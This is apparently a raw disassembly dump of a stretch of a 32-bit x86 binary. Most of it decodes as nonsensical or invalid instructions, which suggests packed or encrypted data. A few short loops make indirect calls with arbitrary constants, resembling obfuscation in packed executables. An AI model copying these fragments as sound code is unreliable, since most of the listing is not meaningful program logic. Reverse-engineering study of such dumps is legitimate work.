  4128cb:	dec    edi
  4128cc:	sbb    eax,0xf2a82872
  4128d1:	adc    DWORD PTR [edx],ecx
  4128d3:	inc    edx
  4128d4:	mov    ebx,0x488ec41d
  4128d9:	inc    edi
  4128da:	xchg   cl,bh
  4128dc:	lock jl 0x412945
  4128df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128e0:	add    al,0x17
  4128e2:	dec    eax
  4128e3:	adc    eax,0x98a74a2b
  4128e8:	data16 mov ds:0xce6bcec0,al
  4128ee:	xchg   BYTE PTR [edx+edx*2-0x4a],dh
  4128f2:	lods   al,BYTE PTR ds:[esi]
  4128f3:	xchg   ecx,eax
  4128f4:	data16 ror cl,cl
  4128f7:	pop    ecx
  4128f8:	fst    QWORD PTR [esi+0x7d9dd004]
  4128fe:	mov    ebp,eax
  412900:	push   ss
  412901:	(bad)  
  412902:	shr    dh,0xa8
  412905:	push   eax
  412906:	xor    BYTE PTR [eax],ah
  412908:	fstp   DWORD PTR [esp+ecx*2]
  41290b:	pop    ecx
  41290c:	and    edx,DWORD PTR [edi+0x6c]
  41290f:	sbb    eax,0xaf3acef0
  412914:	std    
  412915:	push   edx
  412916:	mov    BYTE PTR [edx],0xb9
  412919:	sub    BYTE PTR [ebp+0x7d0121e3],dl
  41291f:	(bad)  
  412920:	sbb    edx,DWORD PTR [edi+0x35]
  412923:	jmp    0x629c:0x1de54a30
  41292a:	fisttp QWORD PTR [eax-0x5a4297d0]
  412930:	pop    ebp
  412931:	sbb    ecx,DWORD PTR [eax-0x4046730e]
  412937:	pop    esp
  412938:	nop
  412939:	jmp    0x30d06fe
  41293e:	mov    WORD PTR [edi+eiz*4+0x2d],ds
  412942:	cmc    
  412943:	mov    dh,0x7e
  412945:	adc    BYTE PTR [edi],dl
  412947:	mov    bh,BYTE PTR [ebx+0x35]
  41294a:	push   cs
  41294b:	int3   
  41294c:	xor    BYTE PTR [edx+0x30],0x69
  412950:	fmul   st(5),st
  412952:	push   edi
  412953:	and    eax,0xe44a8080
  412958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412959:	or     esi,esp
  41295b:	loop   0x412925
  41295d:	gs xchg esp,eax
  41295f:	mov    bl,0x39
  412961:	enter  0x40a1,0x2e
  412965:	nop
  412966:	pop    esi
  412967:	cmp    DWORD PTR [esi+ebx*2+0x52],0x7f1db757
  41296f:	adc    BYTE PTR [ebp-0x5f921d9f],bh
  412975:	call   0x49b:0x29b2d77c
  41297c:	push   ecx
  41297d:	xor    BYTE PTR [esi-0x37d4e0c4],cl
  412983:	mov    ds:0xd6b1b8f8,eax
  412988:	push   ss
  412989:	mov    bh,0xa4
  41298b:	fmul   QWORD PTR [esp+eiz*4]
  41298e:	sub    edi,ebp
  412990:	push   eax
  412991:	xchg   esi,eax
  412992:	fdivp  st(6),st
  412994:	xchg   DWORD PTR [esi],ecx
  412996:	shl    edi,1
  412998:	jp     0x412950
  41299a:	cmc    
  41299b:	(bad)  
  41299c:	mov    al,ds:0xdd6d428a
  4129a1:	jp     0x4129d8
  4129a3:	mov    edx,0x466c333b
  4129a8:	pop    ecx
  4129a9:	lahf   
  4129aa:	(bad)  [edi]
  4129ac:	icebp  
  4129ad:	xchg   esi,eax
  4129ae:	ret    
  4129af:	das    
  4129b0:	push   ebp
  4129b1:	repnz pop ecx
  4129b3:	lods   al,BYTE PTR ds:[esi]
  4129b4:	jmp    0x8638:0xd4b4de74
  4129bb:	call   0x3d6a89af
  4129c0:	je     0x412a13
  4129c2:	mov    edi,DWORD PTR [edi+0x3eb2e233]
  4129c8:	pop    edx
  4129c9:	retf   0x3a98
  4129cc:	popa   
  4129cd:	out    0x9c,eax
  4129cf:	inc    esi
  4129d0:	or     BYTE PTR ds:0x8e5f8d3b,bl
  4129d6:	mov    ah,0xb3
  4129d8:	(bad)  
  4129d9:	fistp  DWORD PTR [eax]
  4129db:	neg    BYTE PTR [ebx]
  4129dd:	es push ecx
  4129df:	cmp    DWORD PTR [edi-0x4e17cbee],eax
  4129e5:	adc    ch,BYTE PTR [ebx+0x6afc27c5]
  4129eb:	adc    al,0xc9
  4129ed:	loope  0x4129f1
  4129ef:	test   al,0xd7
  4129f1:	fmul   QWORD PTR [edx]
  4129f3:	push   edx
  4129f4:	jbe    0x412a72
  4129f6:	cmp    eax,0xfd1c17
  4129fb:	xor    BYTE PTR [ecx],dl
  4129fd:	pushf  
  4129fe:	adc    ecx,DWORD PTR [eax+0x78b22cf2]
  412a04:	sti    
  412a05:	or     al,0xbd
  412a07:	or     eax,0x66a25bbc
  412a0c:	fs dec esp
  412a0e:	xchg   edx,eax
  412a0f:	mov    WORD PTR [ecx-0x2d],gs
  412a12:	and    DWORD PTR [ebp+0x6722d38d],eax
  412a18:	ins    BYTE PTR es:[edi],dx
  412a19:	lock sub eax,0x8c53626e
  412a1f:	jno    0x412a29
  412a21:	pop    ebx
  412a22:	fiadd  DWORD PTR [eax]
  412a24:	xor    dl,BYTE PTR [edi+0x2]
  412a27:	aas    
  412a28:	loop   0x412a0c
  412a2a:	xor    al,0xc
  412a2c:	add    eax,DWORD PTR [esi-0x289c5715]
  412a32:	inc    ebp
  412a33:	mov    al,ds:0xae5d9645
  412a38:	fsub   st(1),st
  412a3a:	mov    eax,ds:0x80ce1cee
  412a3f:	xor    eax,0x84b55e26
  412a44:	into   
  412a45:	jmp    0x394a:0xa0bd6381
  412a4c:	xor    esi,esi
  412a4e:	jmp    0x13f3:0x81e91fef
  412a55:	mov    ah,0x6d
  412a57:	jl     0x412a14
  412a59:	inc    ecx
  412a5a:	popf   
  412a5b:	xlat   BYTE PTR ds:[ebx]
  412a5c:	xor    BYTE PTR [edi+0x49],0x9e
  412a60:	or     DWORD PTR [ecx-0x4e],eax
  412a63:	sub    ch,BYTE PTR [ebx]
  412a65:	jo     0x412ab5
  412a67:	fcom   QWORD PTR [edx]
  412a69:	out    0x81,eax
  412a6b:	lock lods eax,DWORD PTR ds:[esi]
  412a6d:	out    dx,al
  412a6e:	fstp   DWORD PTR [edi-0x2c]
  412a71:	pop    esp
  412a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a73:	add    al,0x37
  412a75:	or     dl,BYTE PTR ds:[ecx+ebx*2-0x8e30c66]
  412a7d:	in     al,0xad
  412a7f:	sub    BYTE PTR ds:0xc5e6b3c8,ah
  412a85:	dec    ebp
  412a86:	jp     0x412a0b
  412a88:	and    BYTE PTR [edi],ch
  412a8a:	jae    0x412a7e
  412a8c:	cli    
  412a8d:	mov    esp,?
  412a8f:	jbe    0x412aa0
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    cl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fcf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fcf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412aee
  412b3b:	sub    BYTE PTR [edi-0x1d],dl
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412ac7
  412b47:	mov    dh,0x34
  412b49:	add    esi,edi
  412b4b:	cmp    al,0x98
  412b4d:	loope  0x412bc9
  412b4f:	ss sar esi,cl
  412b52:	cmp    eax,0xa50ced6e
  412b57:	jg     0x412b44
  412b59:	inc    ebp
  412b5a:	lahf   
  412b5b:	push   edx
  412b5c:	fwait
  412b5d:	sub    BYTE PTR [esi+eiz*2],0x1f
  412b61:	popa   
  412b62:	dec    eax
  412b63:	out    0x8a,eax
  412b65:	sub    eax,0xb2853274
  412b6a:	push   ss
  412b6b:	jo     0x412bb0
  412b6d:	jmp    0x6fb0d4c6
  412b72:	cmp    BYTE PTR [ebx-0x5cd5034f],bl
  412b78:	scas   al,BYTE PTR es:[edi]
  412b79:	rcr    BYTE PTR [ebp-0x2b4586fb],0x50
  412b80:	sbb    al,0x41
  412b82:	sbb    al,0x51
  412b84:	(bad)  
  412b85:	addr16 (bad) 
  412b87:	adc    ebp,ebx
  412b89:	shl    DWORD PTR [ebx],0xd0
  412b8c:	dec    edi
  412b8d:	push   edx
  412b8e:	cmp    eax,0x792a2ad7
  412b93:	enter  0xec97,0xe4
  412b97:	sti    
  412b98:	test   bl,cl
  412b9a:	add    DWORD PTR [eax],ecx
  412b9c:	adc    al,0x4d
  412b9e:	(bad)  
  412b9f:	out    dx,al
  412ba0:	add    ah,BYTE PTR fs:[edi-0x68]
  412ba4:	mov    dh,0x79
  412ba6:	sbb    ebp,edx
  412ba8:	je     0x412b7a
  412baa:	push   edx
  412bab:	pop    ecx
  412bac:	into   
  412bad:	mov    ebp,0xbaf39230
  412bb2:	scas   eax,DWORD PTR es:[edi]
  412bb3:	push   ebx
  412bb5:	out    dx,eax
  412bb6:	xor    eax,DWORD PTR [ecx+0x1f366540]
  412bbc:	repnz cld 
  412bbe:	add    eax,edi
  412bc0:	mov    ds:0x9b4d5ee3,eax
  412bc5:	mov    ebx,0x84d4b914
  412bca:	jp     0x412b6c
  412bcc:	sub    ah,bl
  412bce:	sub    eax,0xd44bafbe
  412bd3:	mov    edx,0xcb27032e
  412bd8:	mov    esi,0x8c596ddc
  412bdd:	pop    ebx
  412bde:	outs   dx,DWORD PTR ds:[esi]
  412bdf:	push   ecx
  412be0:	adc    cl,al
  412be2:	push   ss
  412be3:	maskmovq mm5,(bad)
  412be4:	imul   DWORD PTR [esi+0x33134df4]
  412bea:	xchg   BYTE PTR [ebp-0x53],ch
  412bed:	fcomp  QWORD PTR [esp+eiz*8+0x64]
  412bf1:	dec    ecx
  412bf2:	jno    0x412b8d
  412bf4:	sbb    BYTE PTR [ecx+0x5a94cb55],bl
  412bfa:	mov    bh,0x30
  412bfc:	add    BYTE PTR [ebx+ebx*8+0x35057fda],ah
  412c03:	and    eax,0x175cd809
  412c08:	sbb    DWORD PTR [eax-0x7f],ebx
  412c0b:	sub    al,BYTE PTR [ebp+eiz*8+0x78]
  412c0f:	sbb    dl,cl
  412c11:	push   ss
  412c12:	adc    BYTE PTR [ecx-0x3bc63282],dl
  412c18:	adc    DWORD PTR [edi],ecx
  412c1a:	mov    dh,0x67
  412c1c:	les    eax,FWORD PTR [edi+0x20f518fc]
  412c22:	push   ebp
  412c23:	ret    
  412c24:	dec    eax
  412c25:	push   ecx
  412c26:	adc    ebp,edx
  412c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c29:	jmp    0x6cf1ccd7
  412c2e:	rcl    ebp,1
  412c30:	aam    0x56
  412c32:	in     al,0x6d
  412c34:	sbb    eax,ecx
  412c36:	mov    esp,0x6d34775
  412c3b:	les    edx,FWORD PTR [ebx+0x78]
  412c3e:	jg     0x412c57
  412c40:	sbb    esp,DWORD PTR [ebx+0x38]
  412c43:	jg     0x412c68
  412c45:	cmp    bh,dl
  412c47:	mov    esp,0xaf74128f
  412c4c:	jmp    0x412cba
  412c4e:	mov    ecx,ss
  412c50:	inc    esp
  412c51:	cmp    ecx,edx
  412c53:	cmp    dl,BYTE PTR [edx]
  412c55:	retf   
  412c56:	daa    
  412c57:	mov    esp,0x6e7303b2
  412c5c:	jecxz  0x412c39
  412c5e:	push   ebx
  412c5f:	or     cl,BYTE PTR [ebx-0x40]
  412c62:	daa    
  412c63:	(bad)  
  412c64:	cwde   
  412c65:	dec    ecx
  412c66:	adc    esp,DWORD PTR [ecx]
  412c68:	push   es
  412c69:	outs   dx,BYTE PTR ds:[esi]
  412c6a:	cmp    ebp,ebx
  412c6c:	sbb    eax,0xf5b4424e
  412c71:	xchg   esp,eax
  412c72:	mov    al,ds:0xc5766c32
  412c77:	hlt    
  412c78:	add    bl,0x6
  412c7b:	mov    bl,0xa8
  412c7d:	mov    dh,0xd0
  412c7f:	div    DWORD PTR [edi]
  412c81:	or     edi,0x6586d023
  412c87:	gs dec esi
  412c89:	cmp    eax,0xabd12d5
  412c8e:	stos   DWORD PTR es:[edi],eax
  412c8f:	shl    BYTE PTR [ecx+0x73],0x62
  412c93:	mov    al,ds:0x6a4d6b8b
  412c98:	(bad)  
  412c99:	enter  0xa9bc,0x19
  412c9d:	dec    esi
  412c9e:	call   0xe8d89d88
  412ca3:	push   edx
  412ca4:	add    eax,0xb01261db
  412ca9:	fnstenv [esi]
  412cab:	sbb    DWORD PTR [edi-0x2d],esp
  412cae:	sti    
  412caf:	pop    esi
  412cb0:	in     al,0xe9
  412cb2:	dec    esp
  412cb3:	pop    edx
  412cb4:	jne    0x412cc2
  412cb6:	push   cs
  412cb7:	fild   DWORD PTR [esi+0x94b0a5f]
  412cbd:	jl     0x412d2c
  412cbf:	retf   
  412cc0:	jns    0x412c45
  412cc2:	call   0x6678a9eb
  412cc7:	adc    eax,0x98bdb916
  412ccd:	and    edi,esp
  412ccf:	mov    al,ds:0x555c399c
  412cd4:	mov    eax,0x5fd7a87b
  412cd9:	cmc    
  412cda:	fcmovb st,st(0)
  412cdc:	dec    edx
  412cdd:	stos   DWORD PTR es:[edi],eax
  412cde:	sbb    eax,0xa0ad6864
  412ce3:	sbb    eax,0x106882ab
  412ce8:	dec    edx
  412ce9:	mov    WORD PTR es:[ecx+0x75b47615],gs
  412cf0:	fbld   TBYTE PTR [eax-0x5]
  412cf3:	into   
  412cf4:	outs   dx,BYTE PTR ds:[esi]
  412cf5:	cwde   
  412cf6:	leave  
  412cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf8:	test   eax,0xe571da7c
  412cfd:	pop    esp
  412cfe:	data16 fwait
  412d00:	cs aam 0xa8
  412d03:	ror    DWORD PTR [esi+eax*8],cl
  412d06:	iret   
  412d07:	sbb    ch,ch
  412d09:	jecxz  0x412cad
  412d0b:	aad    0xec
  412d0d:	pop    ss
  412d0e:	xor    DWORD PTR [eax+0x3],edi
  412d11:	into   
  412d12:	xlat   BYTE PTR ds:[ebx]
  412d13:	in     eax,0x56
  412d15:	leave  
  412d16:	scas   al,BYTE PTR es:[edi]
  412d17:	push   ebx
  412d18:	xor    DWORD PTR [ecx],esi
  412d1a:	xchg   esp,eax
  412d1b:	mov    ah,0x12
  412d1d:	pop    edi
  412d1e:	retf   
  412d1f:	xchg   esi,eax
  412d20:	jle    0x412cb8
  412d22:	and    eax,0x3bb9f70
  412d27:	cmp    eax,0xc2733c12
  412d2c:	imul   edx,DWORD PTR [ecx+0x41],0x6928e3ae
  412d33:	mov    ebp,0x7e02473a
  412d38:	repz mov ch,0x85
  412d3b:	hlt    
  412d3c:	shr    BYTE PTR [esi+0x273c0715],0x28
  412d43:	add    edi,DWORD PTR [edi+0x1a]
  412d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d47:	sti    
  412d48:	xchg   DWORD PTR [edx+0x7625ee13],eax
  412d4e:	adc    ebx,DWORD PTR [edi-0x14]
  412d51:	lea    edx,[edi]
  412d53:	xchg   ebx,eax
  412d54:	mov    ecx,0x6de1bbaf
  412d59:	jno    0x412d55
  412d5b:	jge    0x412d47
  412d5d:	das    
  412d5e:	fnstcw WORD PTR [edx-0x1b714d40]
  412d64:	popa   
  412d65:	dec    ebp
  412d66:	fldcw  WORD PTR [ecx+ebp*2]
  412d69:	gs call 0x3f0b4a4c
  412d6f:	fisubr WORD PTR [esi+0xf]
  412d72:	fldcw  WORD PTR [ebx+0x64311722]
  412d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d79:	pop    ss
  412d7a:	in     al,0xf2
  412d7c:	popf   
  412d7d:	rcl    DWORD PTR [esi],cl
  412d7f:	imul   ebp,DWORD PTR [ebx+0x11],0xb45279c8
  412d86:	xor    esp,ebp
  412d88:	adc    eax,0xa699935c
  412d8d:	(bad)  
  412d8e:	sbb    al,0x11
  412d90:	mov    WORD PTR [edx],ss
  412d92:	push   esp
  412d93:	inc    edx
  412d94:	into   
  412d95:	fmulp  st(6),st
  412d97:	in     al,0xc8
  412d99:	repz rcr ebx,1
  412d9c:	in     al,0xa2
  412d9e:	mov    ecx,0xa2cbe42d
  412da3:	inc    eax
  412da4:	nop
  412da5:	sti    
  412da6:	test   DWORD PTR [ebx-0x15],ecx
  412da9:	and    eax,0x84eba55d
  412dae:	inc    edi
  412daf:	xor    BYTE PTR [esi+0x423d761f],0x26
  412db6:	xor    al,0x5
  412db8:	pop    ebp
  412db9:	xor    DWORD PTR [esi+0x52],ebp
  412dbc:	push   0x60
  412dbe:	jmp    0x412df1
  412dc0:	nop
  412dc1:	push   ecx
  412dc2:	hlt    
  412dc3:	mov    eax,0xe697d369
  412dc8:	mov    ebx,0xdaa789
  412dcd:	jae    0x412e22
  412dcf:	xchg   ebx,eax
  412dd0:	push   ds
  412dd1:	mov    edi,0x1d9663b4
  412dd6:	jg     0x412de6
  412dd8:	mov    ?,WORD PTR [ecx+0x17]
  412ddb:	mov    ah,0x7a
  412ddd:	mov    al,0x48
  412ddf:	adc    esp,edi
  412de1:	inc    eax
  412de2:	shl    DWORD PTR [ebx],1
  412de4:	mov    esi,0x7e0eba02
  412de9:	lahf   
  412dea:	mov    ebx,0x6c140cec
  412def:	xor    dl,BYTE PTR [ecx+eax*1]
  412df2:	or     BYTE PTR [eax-0x6fc281df],0x98
  412df9:	sahf   
  412dfa:	mov    ecx,0x727fb92e
  412dff:	cmc    
  412e00:	fistp  QWORD PTR [edx]
  412e02:	sbb    eax,0xbb26c5cd
  412e07:	add    al,BYTE PTR [edx]
  412e09:	ret    
  412e0a:	mov    ds:0xce8714b2,eax
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   si,cx
  412e76:	jge    0x412eda
  412e78:	xchg   edx,eax
  412e79:	pop    edx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x9f70707e
  412e82:	lock fwait
  412e84:	retf   0x2b10
  412e87:	fbld   TBYTE PTR [ebx+ebx*4-0x3809bb99]
  412e8e:	daa    
  412e8f:	out    0xc6,al
  412e91:	sahf   
  412e92:	xor    eax,0xe9097633
  412e97:	repnz mov edx,ecx
  412e9a:	aam    0xe4
  412e9c:	dec    ecx
  412e9d:	icebp  
  412e9e:	xor    edi,edx
  412ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea1:	repz push es
  412ea3:	cmp    esi,DWORD PTR [edi+0x5270e111]
  412ea9:	push   es
  412eaa:	jp     0x412e74
  412eac:	bound  ebx,QWORD PTR [edi-0x1e]
  412eaf:	xor    dh,al
  412eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb2:	pop    ebx
  412eb3:	cmp    bh,BYTE PTR [esi]
  412eb5:	dec    esp
  412eb6:	rol    BYTE PTR [ebp+eax*8-0x19],0x8d
  412ebb:	es sahf 
  412ebd:	push   ebp
  412ebe:	xor    al,BYTE PTR [eax+0x37620e69]
  412ec4:	aas    
  412ec5:	(bad)  
  412ec6:	xor    ebp,DWORD PTR [edx+0x12daf637]
  412ecc:	xor    ecx,DWORD PTR gs:[ebp-0x81e26f7]
  412ed3:	fwait
  412ed4:	stc    
  412ed5:	jecxz  0x412eab
  412ed7:	in     al,dx
  412ed8:	leave  
  412ed9:	mov    bl,0xb9
  412edb:	mov    DWORD PTR [edx+0x3c],edi
  412ede:	and    eax,0x432db520
  412ee3:	stos   DWORD PTR es:[edi],eax
  412ee4:	push   ebp
  412ee5:	fisub  WORD PTR [ebp+ebx*2-0x1887ab40]
  412eec:	mov    ds:0x3a8796e5,eax
  412ef1:	imul   eax,ebp,0xffffff99
  412ef4:	lods   al,BYTE PTR ds:[esi]
  412ef5:	(bad)  
  412ef6:	mov    dh,0xa8
  412ef8:	sub    eax,0xd37b55a1
  412efd:	aad    0xea
  412eff:	pop    eax
  412f00:	push   ds
  412f01:	shr    DWORD PTR [edx+0x5ba9a7c7],1
  412f07:	shl    dl,1
  412f09:	push   0x11
  412f0b:	sub    eax,edx
  412f0d:	jns    0x412e9e
  412f0f:	popf   
  412f10:	ret    
  412f11:	cmp    DWORD PTR [esi],ecx
  412f13:	jmp    0xdaac:0xd211da68
  412f1a:	inc    ecx
  412f1b:	fisttp DWORD PTR [esi+0x6]
  412f1e:	sar    BYTE PTR [esi+eax*2+0x33],1
  412f22:	xchg   edx,eax
  412f23:	mov    dh,0xc7
  412f25:	add    al,0x23
  412f27:	icebp  
  412f28:	(bad)  [esi]
  412f2a:	or     eax,0xdcd7abc1
  412f2f:	mov    eax,ds:0x3fd03300
  412f34:	add    eax,0xfbf79c23
  412f39:	pop    ds
  412f3a:	and    BYTE PTR [esi+0x27],ah
  412f3d:	and    edx,DWORD PTR [edi]
  412f3f:	loop   0x412f1a
  412f41:	ds idiv edi
  412f44:	sbb    al,0xe5
  412f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f47:	cli    
  412f48:	mov    eax,0x8aca416e
  412f4d:	ja     0x412ef0
  412f4f:	fs out dx,eax
  412f51:	(bad)  gs:[ecx-0x2e]
  412f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f56:	xor    bl,bl
  412f58:	inc    esp
  412f59:	ins    BYTE PTR es:[edi],dx
  412f5a:	adc    DWORD PTR [edx-0x6feeb891],eax
  412f60:	jno    0x412f7c
  412f62:	retf   0x6e4a
  412f65:	aas    
  412f66:	mov    bl,BYTE PTR [esi+eiz*4-0x7d]
  412f6a:	(bad)  
  412f6c:	jmp    0x412f03
  412f6e:	addr16 inc edx
  412f70:	push   cs
  412f71:	xchg   DWORD PTR [ecx],eax
  412f73:	mov    ebx,0x7e01155f
  412f78:	outs   dx,DWORD PTR ds:[esi]
  412f79:	stc    
  412f7a:	icebp  
  412f7b:	dec    ebx
  412f7c:	push   ss
  412f7d:	aad    0x37
  412f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f80:	mov    dl,0xdd
  412f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f83:	jae    0x412fbb
  412f85:	mov    esi,0x7b815c82
  412f8a:	cmp    esi,DWORD PTR [ecx+0x37ac42b4]
  412f90:	push   eax
  412f91:	(bad)  
  412f93:	cmp    eax,0xed696316
  412f98:	xchg   ebx,eax
  412f99:	dec    edi
  412f9a:	bound  edx,QWORD PTR [ebp-0x65]
  412f9d:	in     eax,dx
  412f9e:	pop    eax
  412f9f:	aad    0x4b
  412fa1:	icebp  
  412fa2:	mov    esi,0xbb242565
  412fa7:	adc    BYTE PTR ss:[edx+0x73f5a55d],dl
  412fae:	lock je 0x412fb8
  412fb1:	scas   al,BYTE PTR es:[edi]
  412fb2:	jle    0x412f77
  412fb4:	lock pop ss
  412fb6:	dec    esp
  412fb7:	and    al,0x61
  412fb9:	push   cs
  412fba:	retf   0x50b2
  412fbd:	push   edx
  412fbe:	sub    eax,DWORD PTR [ebx]
  412fc0:	dec    ebx
  412fc1:	icebp  
  412fc2:	(bad)  
  412fc3:	adc    al,0x30
  412fc5:	in     al,0xc9
  412fc7:	loop   0x413028
  412fc9:	test   eax,0x5db8e36
  412fce:	fxtract 
  412fd0:	adc    edi,DWORD PTR [ecx-0x3d6c233d]
  412fd6:	xor    eax,0x70aa9975
  412fdb:	pushf  
  412fdc:	mov    cl,0x2d
  412fde:	int3   
  412fdf:	and    BYTE PTR [ecx+0xa],al
  412fe2:	hlt    
  412fe3:	scas   al,BYTE PTR es:[edi]
  412fe4:	push   ebp
  412fe5:	jge    0x412fdf
  412fe7:	aad    0x9d
  412fe9:	push   eax
  412fea:	in     eax,dx
  412feb:	call   0x8574:0xae65e703
  412ff2:	xor    dh,BYTE PTR [ebx+0x44dea9b8]
  412ff8:	sbb    eax,0x9f93f685
  412ffd:	mov    ebp,0xa171eb6a
  413002:	sub    DWORD PTR [ecx],esp
  413004:	sbb    al,0xe9
  413006:	cmp    ecx,edi
  413008:	lock or ebx,DWORD PTR [edi-0x2b]
  41300c:	ins    DWORD PTR es:[edi],dx
  41300d:	push   edi
  41300e:	add    edi,ecx
  413010:	into   
  413011:	or     eax,0x62c46377
  413016:	dec    esp
  413017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413018:	pop    ebp
  413019:	mov    al,ds:0x6d7531ff
  41301e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41301f:	pop    edx
  413020:	jno    0x412fc8
  413022:	out    0x16,al
  413024:	jne    0x413061
  413026:	pop    ss
  413027:	scas   eax,DWORD PTR es:[edi]
  413028:	jo     0x412fbf
  41302a:	hlt    
  41302b:	jmp    0x7bb5:0x1dad23d5
  413032:	into   
  413033:	mov    dh,0x12
  413035:	dec    esp
  413036:	push   cs
  413037:	test   al,0x4c
  413039:	mov    al,ds:0xaeeec59d
  41303e:	push   ss
  41303f:	fcmovnu st,st(2)
  413041:	(bad)  
  413043:	push   esp
  413044:	jle    0x412fd4
  413046:	xor    DWORD PTR [edi+0x7c],ebx
  413049:	pop    edx
  41304a:	imul   eax,DWORD PTR [edx+eax*8-0x38dde0ab],0xfffffff6
  413052:	call   0x4f48a232
  413057:	mov    ds:0x434d6008,eax
  41305c:	or     dl,0x7a
  41305f:	pop    edx
  413060:	mov    al,0x4f
  413062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413063:	mov    eax,0x49cc3dd6
  413068:	repz xchg edi,eax
  41306a:	push   cs
  41306b:	push   esp
  41306c:	outs   dx,DWORD PTR ds:[esi]
  41306d:	add    cl,ch
  41306f:	inc    ebp
  413070:	jo     0x413012
  413072:	sub    eax,DWORD PTR [esi+0x1075298d]
  413078:	jae    0x413063
  41307a:	cmp    eax,0xeada0d9c
  41307f:	int3   
  413080:	ja     0x413005
  413082:	in     al,dx
  413083:	mov    esi,0xd07ad48d
  413088:	ins    DWORD PTR es:[edi],dx
  413089:	jae    0x4130b5
  41308b:	xchg   edx,eax
  41308c:	les    esi,FWORD PTR [ebx+0x72]
  41308f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413090:	push   esi
  413091:	loop   0x4130d1
  413093:	test   al,0x9a
  413095:	mov    ds:0xb1204196,eax
  41309a:	out    0xab,al
  41309c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41309d:	xchg   edx,eax
  41309e:	sub    edx,ecx
  4130a0:	pop    edi
  4130a1:	ficomp WORD PTR [eax-0x44d9208d]
  4130a7:	lds    eax,FWORD PTR [ecx-0x7f]
  4130aa:	std    
  4130ab:	xor    BYTE PTR [ebp-0x289ea4f5],dh
  4130b1:	adc    DWORD PTR [edi],ebp
  4130b3:	inc    esp
  4130b4:	out    0x73,eax
  4130b6:	xchg   ecx,eax
  4130b7:	and    al,0x87
  4130b9:	jge    0x413060
  4130bb:	pop    es
  4130bc:	inc    esi
  4130bd:	test   al,0x17
  4130bf:	ins    BYTE PTR es:[edi],dx
  4130c0:	and    ah,ah
  4130c2:	repnz nop
  4130c4:	mov    ah,0x66
  4130c6:	mov    DWORD PTR [eax+0x5],edx
  4130c9:	or     eax,0xfc5623b4
  4130ce:	or     DWORD PTR [ebx-0xbf3a040],ebp
  4130d4:	sub    al,0xe6
  4130d6:	push   0x31
  4130d8:	repz pop ebp
  4130da:	fs mov ecx,0x7ee8e378
  4130e0:	hlt    
  4130e1:	push   0x1
  4130e3:	mov    eax,ds:0x5698a953
  4130e8:	ret    
  4130e9:	inc    ecx
  4130ea:	and    edi,DWORD PTR [esi+0xe]
  4130ed:	loope  0x4130d0
  4130ef:	and    dh,dl
  4130f1:	pop    edi
  4130f2:	xor    dl,BYTE PTR [ebp-0x18]
